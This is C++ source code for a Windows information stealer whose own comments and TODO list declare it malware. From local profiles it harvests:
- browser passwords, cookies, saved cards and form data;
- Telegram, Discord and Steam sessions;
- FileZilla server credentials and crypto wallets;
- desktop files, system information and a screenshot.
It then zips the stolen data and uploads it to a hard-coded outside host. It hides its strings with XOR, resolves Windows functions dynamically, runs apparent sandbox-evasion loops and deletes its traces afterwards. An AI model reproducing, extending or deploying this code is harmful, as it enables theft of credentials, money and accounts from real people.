#include "file.h"
#include "Stealing.h"
#include "xor.h"
#include "DynImport.h"
#include <clocale>

#define XOR(x) XorStr(x)

using std::string;

file File;
auto* folder = File.dirInstance();

namespace Stealer
{
	string GetHwid()
	{
		string output = "";

		DWORD dwVolume;
		FNC(GetVolumeInformationA, XOR("Kernel32.dll"))(XOR("C://"), 0, 0, &dwVolume, 0, 0, 0, 0);
		dwVolume -= dwVolume << 2;
		dwVolume += dwVolume - (2346278 << 16);
		if (dwVolume < 0)
			dwVolume *= -1;

		output = std::to_string(dwVolume);

		string res = "";
		for (std::size_t i = 0; i < output.length(); ++i)
		{
			if ((i + 1) % 2 == 0)
				res += (char)('A' - 1 + (int)output[i]);
			else
				res += output[i];
		}

		for (char& ch : res)
			if(ch >= 'a' && ch <= 'z')
				ch = toupper(ch);

		return res;
	}
	const string hwid = GetHwid();

	//URLS:
	const string UpLoadLink = XOR("opmolewahero.esy.es");

	//TAG:
	const string senderTag = XOR("");

	//WORKING FILES:
	const string appdata_path = string(getenv(XOR("AppData")));
	const string dir_for_send = appdata_path + XOR("\\pts") + hwid;
	const string zip_for_send = appdata_path + XOR("\\arc") + hwid + XOR(".zip");

	const string environmentVariable = string(getenv(XOR("LocalAppData")));

	const string fzXmls[] =
	{
		appdata_path + XOR("\\FileZilla\\recentservers.xml"),
		appdata_path + XOR("\\FileZilla\\sitemanager.xml")
	};

	void GetBrowsers(Stealing* sender, const string& path = environmentVariable)
	{
		try
		{
			// Cookies ; Web Data ; Login Data
			WIN32_FIND_DATA data;
			HANDLE hFile = FNC(FindFirstFileA, XOR("Kernel32.dll"))((path + "\\*").c_str(), &data);

			if (hFile != INVALID_HANDLE_VALUE)
			{
				do
				{
					const string cur_file = data.cFileName;
					if (cur_file == "." || cur_file == "..")
						continue;
					if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						GetBrowsers(sender, path + "\\" + cur_file);
					else
					{
						const string cur_path = path + "\\" + cur_file;
						if (cur_file == XOR("Cookies"))
							sender->GetCookies(cur_path);
						else if (cur_file == XOR("Login Data"))
						{
							if (sender->define_browser(cur_path) == XOR("Opera"))
							{
								sender->GetCards(cur_path);
								sender->GetForms(cur_path);
							}
							
							sender->GetPasswords(cur_path);
						}
						else if (cur_file == XOR("Web Data"))
						{
							sender->GetCards(cur_path);
							sender->GetForms(cur_path);
						}
						else if (cur_file == XOR("formhistory.sqlite"))
							sender->GetFormsGecko(cur_path);
						else if (cur_file == XOR("cookies.sqlite"))
							File.Copy(cur_path,
								dir_for_send + XOR("\\General\\") + sender->define_browser(cur_path) +
								"_" + std::to_string(FNC(GetTickCount, XOR("Kernel32.dll"))() / 1000) + XOR(".sqlite"));
					}
				} while (FNC(FindNextFileA, XOR("Kernel32.dll"))(hFile, &data));
			}

			FNC(FindClose, XOR("Kernel32.dll"))(hFile);
		}
		catch (...)
		{
			return;
		}
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	char* memdmp = NULL;
	memdmp = (char*)malloc(104857600);

	if (memdmp != NULL)
	{
		memset(memdmp, 0, 104857600);
		char symbols[5] = 
		{
			(char)~(-103),
			(char)~(-118),
			(char)~(-100),
			(char)~(-108),
			(char)~(-118)
		};
		// JUNK
		for (int i = 0; i < 104857600; ++i)
		{
			const int cur_shift = i % 10;
			if (cur_shift == 0)
				memdmp[i] = symbols[0];
			else if (cur_shift == 1)
				memdmp[i] = symbols[1];
			else if (cur_shift == 2)
				memdmp[i] = symbols[2];
			else if (cur_shift == 3)
				memdmp[i] = symbols[3];
			else if (cur_shift == 4)
				memdmp[i] = symbols[4];
			else if (cur_shift == 5)
				memdmp[i] = symbols[5];
			else if (cur_shift == 6)
				memdmp[i] = symbols[0];
			else if (cur_shift == 7)
				memdmp[i] = symbols[1];
			else if (cur_shift == 8)
				memdmp[i] = symbols[2];
			else if (cur_shift == 9)
				memdmp[i] = symbols[3];
		}

		free(memdmp);

		setlocale(LC_ALL, "");

		int cpt = 0;
		for (int i = 0; i < 100000000; ++i)
			++cpt;

		if (cpt == 100000000)
		{
			if (folder->Exists(Stealer::dir_for_send))
				folder->Delete(Stealer::dir_for_send);
			folder->Create(Stealer::dir_for_send);

			folder->Create(Stealer::dir_for_send + XOR("\\General"));
			Stealing* sender = new Stealing
			(
				Stealer::dir_for_send + XOR("\\General\\passwords.txt"),
				Stealer::dir_for_send + XOR("\\General\\cookies.txt"),
				Stealer::dir_for_send + XOR("\\General\\forms.txt"),
				Stealer::dir_for_send + XOR("\\General\\cards.txt")
			);

			Stealer::GetBrowsers(sender);
			Stealer::GetBrowsers(sender, Stealer::appdata_path);

			folder->Create(Stealer::dir_for_send + XOR("\\Telegram"));
			sender->GetTelegram(Stealer::dir_for_send + XOR("\\Telegram"));

			if (File.Exists(Stealer::fzXmls[0]) || File.Exists(Stealer::fzXmls[1]))
			{
				folder->Create(Stealer::dir_for_send + XOR("\\FileZilla"));
				if (File.Exists(Stealer::fzXmls[0]))
					File.Copy(Stealer::fzXmls[0], Stealer::dir_for_send + XOR("\\FileZilla\\recentservers.xml"));
				if (File.Exists(Stealer::fzXmls[1]))
					File.Copy(Stealer::fzXmls[1], Stealer::dir_for_send + XOR("\\FileZilla\\sitemanager.xml"));
			}

			folder->Create(Stealer::dir_for_send + XOR("\\Discord"));
			sender->GetDiscord(Stealer::dir_for_send + XOR("\\Discord"));

			folder->Create(Stealer::dir_for_send + XOR("\\Desktop"));
			sender->GetDesktopFiles(Stealer::dir_for_send + XOR("\\Desktop"));

			folder->Create(Stealer::dir_for_send + XOR("\\Steam"));
			sender->GetSteam(Stealer::dir_for_send + XOR("\\Steam"));

			folder->Create(Stealer::dir_for_send + XOR("\\Wallets2"));
			sender->GetWalletsPath(Stealer::dir_for_send + XOR("\\Wallets2"));

			folder->Create(Stealer::dir_for_send + XOR("\\Wallets1"));
			sender->GetWalletsReg(Stealer::dir_for_send + XOR("\\Wallets1"));

			sender->GetInformation(Stealer::dir_for_send + XOR("\\Infomation.txt"));
			sender->GetScreenShot(Stealer::dir_for_send + XOR("\\Screenshot.bmp"));

			sender->ZipFolder(Stealer::dir_for_send, Stealer::zip_for_send);

			const string upload_link = XOR("api/gate.get?p1=") + std::to_string(sender->passwords)
				+ XOR("&p2=") + std::to_string(sender->cookies)
				+ XOR("&p3=") + std::to_string(sender->cards)
				+ XOR("&p4=") + std::to_string(sender->forms)
				+ XOR("&p5=") + std::to_string(int(sender->bSteam))
				+ XOR("&p6=") + std::to_string(int(sender->bWallets))
				+ XOR("&p7=") + std::to_string(int(sender->bTeleg));

			sender->Release(Stealer::UpLoadLink, upload_link, Stealer::zip_for_send,
				Stealer::senderTag + Stealer::hwid + XOR(".zip"));

			delete sender;

			folder->Delete(Stealer::dir_for_send);
			FNC(DeleteFileA, XorStr("Kernel32.dll"))(Stealer::zip_for_send.c_str());
		}
	}

	return 1;
}

/*
TODO list:
	- Serialize cookie as a json file
	- Add gecko browsers (passwords and CC)
Done:
	- Information about a PC
	- Steal Discord session
	- Take a screenshot
	- Fixed glitch with non-latin names
	- New browsers
	- Steal crypto wallets
	- Steal telegram session
	- Upload file to php script
	- Make log view more comfortable
*/